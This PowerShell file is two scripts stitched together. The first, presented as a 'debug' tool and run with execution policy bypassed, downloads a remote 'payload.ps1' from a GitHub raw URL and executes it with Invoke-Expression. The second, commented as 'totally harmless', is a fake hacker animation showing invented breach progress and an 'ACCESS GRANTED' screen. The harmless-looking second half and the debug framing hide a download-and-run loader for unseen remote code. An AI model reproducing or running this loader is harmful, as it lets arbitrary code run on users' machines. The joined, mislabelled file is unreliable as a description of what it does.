# Save as debug-matrix.ps1 then run: powershell -ExecutionPolicy Bypass -File .\debug-matrix.ps1

$ErrorActionPreference = "Stop"
$LogFile = "$env:TEMP\matrix_debug.log"

function Write-Log {
    param($Message, $Level="INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    Write-Host $logEntry -ForegroundColor Green
    $logEntry | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

try {
    Write-Log "=== MATRIX DEBUG PAYLOAD STARTING ===" "DEBUG"
    
    # Fix: Use stable GitHub raw URL
    $url = "https://raw.githubusercontent.com/kkeyal223/hue/main/payload.ps1"
    Write-Log "Downloading from: $url" "INFO"
    
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $scriptContent = $webClient.DownloadString($url)
    Write-Log "Download SUCCESS - Length: $($scriptContent.Length) chars" "SUCCESS"
    
    Write-Log "Executing payload..." "INFO"
    Invoke-Expression $scriptContent
    
    Write-Log "Payload completed normally" "SUCCESS"
} catch {
    Write-Log "CRASH DETECTED: $($_.Exception.Message)" "ERROR"
    Write-Log "StackTrace: $($_.ScriptStackTrace)" "ERROR"
    Write-Host "`n=== DEBUG LOG SAVED: $LogFile ===" -ForegroundColor Red
    pause
}
# Fake Hacker Simulation Script
# Totally harmless – just visuals 😎

Clear-Host

function Type-Text($text, $delay = 40) {
    foreach ($char in $text.ToCharArray()) {
        Write-Host -NoNewline $char
        Start-Sleep -Milliseconds $delay
    }
    Write-Host ""
}

function Fake-Progress($activity) {
    for ($i = 0; $i -le 100; $i += (Get-Random -Minimum 3 -Maximum 10)) {
        Write-Progress -Activity $activity -Status "$i% Complete" -PercentComplete $i
        Start-Sleep -Milliseconds (Get-Random -Minimum 80 -Maximum 200)
    }
}

# Intro
Type-Text "Initializing secure terminal..."
Start-Sleep 1
Type-Text "Connecting to remote host 192.168.0.$(Get-Random -Minimum 2 -Maximum 254)..."
Start-Sleep 1

# Fake login
Type-Text "Bypassing firewall..."
Fake-Progress "Firewall Breach"

Type-Text "Injecting payload..."
Fake-Progress "Payload Injection"

Type-Text "Decrypting secure keys..."
Fake-Progress "Decryption"

# Random fake data output
Type-Text "Accessing database..."
Start-Sleep 1

for ($i=0; $i -lt 10; $i++) {
    $randomHash = -join ((48..57 + 65..90 + 97..122) | Get-Random -Count 32 | ForEach-Object {[char]$_})
    Write-Host "[DATA] $randomHash"
    Start-Sleep -Milliseconds 150
}

# Final message
Type-Text "Escalating privileges..."
Start-Sleep 1
Type-Text "Root access granted ✔" 20

Write-Host ""
Write-Host ">>> ACCESS GRANTED <<<" -ForegroundColor Green
Write-Host "Welcome, operator." -ForegroundColor Cyan

Start-Sleep 2

# Ending effect
for ($i=5; $i -ge 1; $i--) {
    Write-Host "Disconnecting in $i..." -ForegroundColor Yellow
    Start-Sleep 1
}

Clear-Host
Write-Host "Session terminated." -ForegroundColor Red
